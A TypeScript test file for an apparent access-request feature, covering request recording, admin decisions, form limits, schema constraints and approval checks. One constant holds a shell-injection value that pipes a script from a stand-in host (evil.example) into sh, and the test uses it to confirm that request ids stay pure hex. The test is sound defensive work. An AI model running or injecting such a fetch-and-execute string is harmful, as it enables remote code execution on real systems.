/**
 * Asking for an account, and deciding about it.
 *
 * The schema carries two of these rules as CHECK constraints as well, so several of these assert
 * the same thing twice on purpose: the library refusing is a better error message, and the
 * constraint refusing is what holds when somebody reaches the table another way.
 */

import { test, before, after, beforeEach } from 'node:test';
import assert from 'node:assert/strict';
import { readTxn, serviceTxn } from './db.ts';
import {
  approvedRequest,
  decideRequest,
  listRequests,
  NoSuchRequest,
  NotApproved,
  pendingCount,
  ReasonRequired,
  REQUEST_LIMITS,
  requestAccess,
} from './access-requests.ts';
import { createTestDatabase, dropTestDatabase } from '../db/testing.ts';

const DB = `folio_req_${process.pid}`;
const ADMIN = 'p1';

before(async () => {
  await createTestDatabase(DB);
  await serviceTxn('system:auth', async (c) => {
    await c.query("INSERT INTO actors (id, kind, label) VALUES ($1, 'person', 'Admin')", [ADMIN]);
    await c.query(
      "INSERT INTO users (id, email, name, is_admin) VALUES ($1, 'admin@x.com', 'Admin', true)",
      [ADMIN],
    );
  });
});

after(async () => {
  await dropTestDatabase(DB);
});

beforeEach(async () => {
  await serviceTxn('system:auth', async (c) => {
    await c.query('DELETE FROM access_requests');
  });
});

const first = async () => (await listRequests())[0]!;

test('a request is recorded, and creates no account', async () => {
  await requestAccess('someone@x.com', 'Someone', 'I run the small-cap book.');
  const r = await first();
  assert.equal(r.email, 'someone@x.com');
  assert.equal(r.status, 'pending');
  assert.equal(r.note, 'I run the small-cap book.');

  const users = await readTxn(async (c) => {
    const { rows } = await c.query('SELECT 1 FROM users WHERE email = $1', ['someone@x.com']);
    return rows.length;
  });
  assert.equal(users, 0, 'a request is not an account');
});

test('asking twice refreshes the request instead of queuing a second', async () => {
  await requestAccess('someone@x.com', 'Someone', 'first reason');
  await requestAccess('someone@x.com', 'Someone Else', 'second reason');
  assert.equal(await pendingCount(), 1);
  const r = await first();
  assert.equal(r.note, 'second reason', 'the standing request is updated');
  assert.equal(r.name, 'Someone Else');
});

test('the address is lowercased, so case cannot open a second request', async () => {
  await requestAccess('Someone@X.com', 'Someone', 'one');
  await requestAccess('someone@x.com', 'Someone', 'two');
  assert.equal(await pendingCount(), 1);
});

test('an address that already has an account records nothing, and says nothing', async () => {
  // Deliberately indistinguishable from a successful request to the caller. An endpoint that told
  // them apart would be a way to find out who works here — the property login() spends a whole
  // dummy Argon2 verify to protect.
  await requestAccess('admin@x.com', 'Admin', 'me again');
  assert.equal(await pendingCount(), 0);
});

test('a request with no name or no address is not recorded', async () => {
  await requestAccess('', 'Someone', 'x');
  await requestAccess('someone@x.com', '   ', 'x');
  assert.equal(await pendingCount(), 0);
});

test('a forged post past the form limits is not recorded, and says nothing', async () => {
  await requestAccess(`${'a'.repeat(REQUEST_LIMITS.email)}@x.com`, 'Someone', 'x');
  await requestAccess('not-an-address', 'Someone', 'x');
  await requestAccess('someone@x.com', 'S'.repeat(REQUEST_LIMITS.name + 1), 'x');
  await requestAccess('someone@x.com', 'Someone', 'n'.repeat(REQUEST_LIMITS.note + 1));
  assert.equal(await pendingCount(), 0);
});

test('an address and a name typed exactly to the form limits are kept', async () => {
  const address = `${'a'.repeat(REQUEST_LIMITS.email - '@x.com'.length)}@x.com`;
  assert.equal(address.length, REQUEST_LIMITS.email);
  await requestAccess(address, 'S'.repeat(REQUEST_LIMITS.name), 'x');
  assert.equal(await pendingCount(), 1);
});

test('a note typed to the limit is kept, though its newlines arrive as CRLF', async () => {
  const line = `${'n'.repeat(99)}\n`;
  const typed = line.repeat(REQUEST_LIMITS.note / line.length);
  assert.equal(typed.length, REQUEST_LIMITS.note);
  await requestAccess('someone@x.com', 'Someone', typed.replace(/\n/g, '\r\n'));
  assert.equal(await pendingCount(), 1);
});

test('approving records who decided, and when', async () => {
  await requestAccess('someone@x.com', 'Someone', 'reason');
  const out = await decideRequest((await first()).id, 'approved', ADMIN, '');
  assert.equal(out.status, 'approved');
  assert.equal(out.decidedByName, 'Admin');
  assert.ok(out.decidedAt);
  assert.equal(await pendingCount(), 0);
});

test('refusing without a reason is refused', async () => {
  await requestAccess('someone@x.com', 'Someone', 'reason');
  const { id } = await first();
  await assert.rejects(() => decideRequest(id, 'rejected', ADMIN, '   '), ReasonRequired);
  // and the request is untouched, so it can still be decided properly
  assert.equal((await first()).status, 'pending');
});

test('refusing with a reason keeps the reason', async () => {
  await requestAccess('someone@x.com', 'Someone', 'reason');
  const out = await decideRequest((await first()).id, 'rejected', ADMIN, 'Not a colleague.');
  assert.equal(out.status, 'rejected');
  assert.equal(out.decidedNote, 'Not a colleague.');
});

test('a request cannot be decided twice', async () => {
  // Two admins with the page open is the ordinary case, not an exotic one. The second click must
  // not silently overwrite the first decision.
  await requestAccess('someone@x.com', 'Someone', 'reason');
  const { id } = await first();
  await decideRequest(id, 'approved', ADMIN, '');
  await assert.rejects(() => decideRequest(id, 'rejected', ADMIN, 'changed my mind'), NoSuchRequest);
  assert.equal((await first()).status, 'approved', 'the first decision stands');
});

test('a decided request does not block asking again', async () => {
  // The partial unique index is on pending rows only: circumstances change, and somebody refused
  // in March should be able to ask again in September.
  await requestAccess('someone@x.com', 'Someone', 'reason');
  await decideRequest((await first()).id, 'rejected', ADMIN, 'not yet');
  await requestAccess('someone@x.com', 'Someone', 'asking again');
  assert.equal(await pendingCount(), 1);
});

test('the schema refuses a rejection with no reason, not only the library', async () => {
  await requestAccess('someone@x.com', 'Someone', 'reason');
  const { id } = await first();
  await assert.rejects(
    () =>
      serviceTxn('system:auth', async (c) => {
        await c.query(
          `UPDATE access_requests SET status = 'rejected', decided_at = now(), decided_by = $2
            WHERE id = $1`,
          [id, ADMIN],
        );
      }),
    /rejection_needs_a_reason/,
  );
});

test('the schema refuses a decision with nobody attached to it', async () => {
  await requestAccess('someone@x.com', 'Someone', 'reason');
  const { id } = await first();
  await assert.rejects(
    () =>
      serviceTxn('system:auth', async (c) => {
        await c.query("UPDATE access_requests SET status = 'approved' WHERE id = $1", [id]);
      }),
    /decided_together/,
  );
});

test('pending requests sort ahead of decided ones', async () => {
  await requestAccess('old@x.com', 'Old', 'x');
  await decideRequest((await first()).id, 'approved', ADMIN, '');
  await requestAccess('new@x.com', 'New', 'y');
  const rows = await listRequests();
  assert.equal(rows[0]?.status, 'pending', 'what needs deciding is at the top');
});

// ---- the id is what gets pasted into a shell, so it carries nothing an applicant wrote ----------

const HOSTILE = '" ; curl http://evil.example/x.sh | sh #';

test('a request id is hex and nothing else, whatever the applicant typed', async () => {
  await requestAccess('mallory@example.com', HOSTILE, HOSTILE);
  const { id, name } = await first();
  assert.equal(name, HOSTILE, 'their name is stored exactly as given');
  // And the id, which is the only part of it that reaches a command line, is not.
  assert.match(id, /^[0-9a-f]{32}$/);
});

test('an account is created from an approved request, by id', async () => {
  await requestAccess('ok@x.com', 'Fine Person', 'reason');
  const { id } = await first();
  await decideRequest(id, 'approved', ADMIN, '');
  assert.deepEqual(await approvedRequest(id), { email: 'ok@x.com', name: 'Fine Person' });
});

test('knowing a request id is not the same as it having been approved', async () => {
  // The whole authorisation for an account is a person having approved it. `seed-user --request`
  // is run by somebody with a shell, so the check has to be here rather than in the screen that
  // prints the id.
  await requestAccess('waiting@x.com', 'Waiting', 'reason');
  const { id } = await first();
  await assert.rejects(() => approvedRequest(id), NotApproved);

  await decideRequest(id, 'rejected', ADMIN, 'not this time');
  await assert.rejects(() => approvedRequest(id), NotApproved);
});

test('an id nobody issued resolves to nothing', async () => {
  await assert.rejects(() => approvedRequest('0'.repeat(32)), NoSuchRequest);
});
